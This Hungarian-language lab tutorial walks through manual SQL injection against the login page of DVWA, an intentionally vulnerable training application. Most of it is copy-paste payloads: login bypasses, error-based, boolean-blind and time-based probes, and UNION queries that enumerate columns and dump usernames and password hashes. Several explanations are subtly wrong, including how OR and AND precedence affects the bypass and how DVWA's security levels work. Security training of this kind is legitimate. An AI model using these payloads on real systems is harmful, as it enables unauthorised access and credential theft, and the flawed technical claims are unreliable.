# DVWA SQL Injection - Manuális Tesztelés Útmutató

## Overview

A DVWA **Login** oldala egy klasszikus SQL injection tesztelési pont. Az alkalmazás úgy van megírva, hogy ha nem megfelelően kezeli az input adatokat, az SQL parancs egy injektált logikával módosítható.

---

## 1. A Login Mechanika

### Normális login

```
Username: admin
Password: password123
```

Az alkalmazás ezt az SQL lekérdezésbe építi be:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
```

Ha a felhasználó létezik ÉS a jelszó helyes → sikeres bejelentkezés.

### SQL Injection login

Ha a username-be ez kerül:

```sql
' OR '1'='1
```

Az SQL lekérdezés így módosul:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'
```

Ez **logikailag** így értelmezendő:
- `username = ''` (nem igaz, mert a username nem üres string)
- `OR '1'='1'` (IGAZ, mert 1 mindig egyenlő 1-gyel)
- Eredmény: az egész feltétel `TRUE` lesz

**Eredmény: Bejelentkezik az első felhasználóként (általában `admin`), jelszó nélkül.**

---

## 2. Login.php Tesztelésének Lépései

### Alapbiztos Lépések:

1. **Nyiss meg egy böngészőt** (Chrome, Firefox)
2. **Navigálj a DVWA-ra:**
   ```
   http://localhost/dvwa/login.php   (ha local)
   ```
3. **Első bejelentkezés alapértelmezett felhasználóval:**
   ```
   Username: admin
   Password: password
   ```
4. **Setup oldal**: Kattints a **"Create / Reset Database"** gombra az adatbázis inicializálásához.
5. (Opcionális) **DevTools (F12)** használatával megvizsgálhatod a beviteli mezőket (`<input name="username">`).
6. **Kijelentkezés (Logout)**. Most már készen állsz a SQLi tesztelésre a Login oldalon.

---

## 3. Konkrét SQL Injection Payloadok a Login-nél

### Egyszerű Bypass - Comment-Based

| Payload | Username | Password | Leírás |
|---|---|---|---|
| `admin' --` | `admin' --` | (bármi) | Komment-alapú bypass, jelszót megjegyzésbe zárja |
| `admin' #` | `admin' #` | (bármi) | MySQL hash-komment (szintén jelszót elhagyja) |
| `' OR 1=1 --` | `' OR 1=1 --` | (bármi) | OR 1=1 + komment = feltételt mindig igazzá teszi |
| `' OR '1'='1` | `' OR '1'='1` | `' OR '1'='1` | Mindkét mezőben: feltétel igaz lesz |
| `' OR 'a'='a` | `' OR 'a'='a` | `' OR 'a'='a` | String összehasonlítás: igaz |
| `admin' UNION SELECT 1,1,1 --` | (haladó) | (haladó) | UNION-based SQLi: több adat visszaadása |

### Legegyszerűbb: COPY-PASTE

```
Username:  ' OR '1'='1
Password:  (hagyj üresen vagy írj bármi)
```

A jelszó mező lehet üres vagy tetszőleges, mivel a SQL lekérdezés:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '(jelszo)'
```

Az `OR '1'='1'` miatt az egész feltétel **TRUE**, így a többi már nem számít.

---

## 4. Az Adatbázis Válaszának Megtekintése

### Mód 1: **Error-Based SQLi** (Legpraktikusabb)

Ha a bevitel hibás SQL szintaxist okoz, az adatbázis hibaüzenetet ad:

**Payload:**
```
Username: ' AND 1=1 UNION SELECT 1,2,3 --
Password: (üres vagy random)
```

**Lehetséges hibamüzenet:**
```
Error: Column count doesn't match value count at row 1
```

Ez megmondja, hogy a `users` tábla 3 oszlopból áll (vagy más szám).

### Mód 2: **Boolean-Based Blind SQLi** (Legfontosabb)

Ha az adatbázis nem jelez hibákat, használj logikai feltételeket:

**Adott payload:**
```
Username: admin' AND 1=1 --
Password: (üres)
```

**Eredmény:** Bejelentkezik → az `1=1` igaz

**Adott payload:**
```
Username: admin' AND 1=2 --
Password: (üres)
```

**Eredmény:** Nem sikerül a bejelentkezés → az `1=2` hamis

**Így működik az információgyűjtés:** Logikai feltételekkel kérdezek rá az adatbázisba.

### Mód 3: **Time-Based Blind SQLi** (Legkönnyebb)

Ha az alkalmazás válaszideje módosítható:

**Payload:**
```
Username: admin' AND SLEEP(5) --
Password: (üres)
```

**Eredmény:** A login oldal betöltése 5 másodpercig tarthat
- Ha 5 másodpercet vár → az SQLi működik
- Ha rögtön válaszol → valószínűleg nincs SQLi (vagy védett)

---

## 5. Az Adatbázis Tényleges Tartalma (MySQL)

### SSH csatlakozás a DVWA VM-hez

```bash
ssh user@192.168.x.x
# jelszó: password

# MySQL csatlakozás
sudo mysql -u root -p
# jelszó: (amit beállítottál a DVWA_SETUP.md-ban)
```

### Lekérdezések az adatbázisban

```sql
-- Adatbazisok listazasa
SHOW DATABASES;

-- DVWA kivalasztasa
USE dvwa;

-- Táblák listázása
SHOW TABLES;

-- Users tábla szerkezete
DESCRIBE users;

-- Users tábla tartalma
SELECT * FROM users;

-- Példa output:
-- | user_id | username | password | user_avatar | last_login | failed_login
```

### 5.1 A befecskendezett query működése MySQL-ben

Ha az `admin' --` payload bejut a lekérdezésbe, az adatbázis ilyen logikát kap:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```

A ` --` után minden megjegyzésbe kerül, így a lekérdezés valójában:

```sql
SELECT * FROM users WHERE username = 'admin'
```

Ez visszaadja az `admin` felhasználó sorát, és **jelszóellenőrzés nélkül** bejelentkezteti.

---

## 6. Haladó: SQL Schema Discovery

### 1. Oszlopok számának megállapítása

Próbálja ezt:

```
Username: ' UNION SELECT 1 --
Password: (üres)
```

Hivamüzenet: `Column count doesn't match value count at row 1`

Majd próbálja 2, 3, 4... oszlopot, míg nem működik:

```
' UNION SELECT 1,2 --
' UNION SELECT 1,2,3 --
' UNION SELECT 1,2,3,4 --
' UNION SELECT 1,2,3,4,5 --
```

**Ha `1,5` működik** → 5 oszlopa van a `users` táblának.

### 2. Adatbázis Verzió Kiderítése

```
Username: ' UNION SELECT 1,2,3,4,version() --
```

Ez visszaadhatja a MySQL verziót az egyik oszlopban.

### 3. Felhasználók Listázása

```
Username: ' UNION SELECT 1,username,password,4,5 FROM users --
```

Ezt listázza ki az összes felhasználót és jelszavát az alkalmazás oldalblon.

---

## 7. Teljesség Ellenőrzés

### Előtte:

```bash
# Terminal-on (mint nagyon user):
mysql> SELECT * FROM users;
+---------+----------+---------------------------------------------+
| user_id | username | password                                    |
+---------+----------+---------------------------------------------+
| 1       | admin    | 5f4dcc3b5aa765d61d8327deb882cf99          |
| 2       | gordonb  | e0bc6879185c76e677d4ff642c06d81f          |
| 3       | 1337     | 8d3533e0265e498b642374a1fb900e61          |
| 4       | pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7          |
| 5       | smithy   | 5f4dcc3b5aa765d61d8327deb882cf99          |
+---------+----------+---------------------------------------------+
```

### Utána (az SQLi segítségével):

Az alkalmazás felületen:
- Bejelentkeztél jelszó nélkül
- Az admin dashboard-ot látod

---

## 8. Biztonsági Szintek (DVWA)

### Low Security

- **Típus:** Error-based SQLi
- **Feldolgozás:** Nincs (közvetlen az SQL-be kerül)
- **Védelem:** Nincs
- **Payloads:** Mindegyik működik

**Bejelentkeztés:**
```
Username: ' OR '1'='1
Password: (üres)
```

### Medium Security

- **Típus:** Behatárolt SQLi
- **Feldolgozás:** `mysqli_real_escape_string` (idzőjelek escape-elése)
- **Védelem:** A bevitelt stringként kezeli
- **Megjegyzés:** A login username egy string, a `'` escape-elődik `\'`-re. Így az egyszerű string elválasztás alapján készült `' OR 1=1 --` nem fog működni, mivel az adatbázis `\' OR 1=1 --` literál ismérves felhasználónevet próbál megkeresni. Ezért a Medium szint a login mezőben nem sérülékeny könnyen SQL injectionre az egyszerű eszközökkel.

### High Security

- **Típus:** Prepared statements vagy white-list
- **Feldolgozás:** Erős szűrés
- **Védelem:** Jó
- **Payloads:** Általában nem működik

### Impossible

- **Típus:** Prepared statements + salt
- **Feldolgozás:** Biztonságos (aktuális standard)
- **Védelem:** Kiváló
- **Payloads:** Nem működik

## Összegzés

```
┌──────────────────────────────────────────────────────┐
│  DVWA Login SQLi Manuális Tesztelés Forgatókönyv    │
├──────────────────────────────────────────────────────┤
│                                                      │
│ 1. Login oldal böngészőben                          │
│ 2. Payload beírása: ' OR '1'='1                     │
│ 3. Jelszó: (üres vagy random)                       │
│ 4. Login gomb kattintása                            │
│ 5. EREDMÉNY: Bejelentkezés jelszó nélkül            │
│ 6. MySQL-ben: SELECT * FROM users                   │
│    (Megerősítés, hogy az adatok valódiak)           │
│                                                      │
└──────────────────────────────────────────────────────┘
```

**A legfontosabb:** Az adatbázis válasza közvetlenül a **böngészőben** látható (error) vagy **logikai viselkedésből** (sikeres/sikertelen bejelentkezés) következtethető.
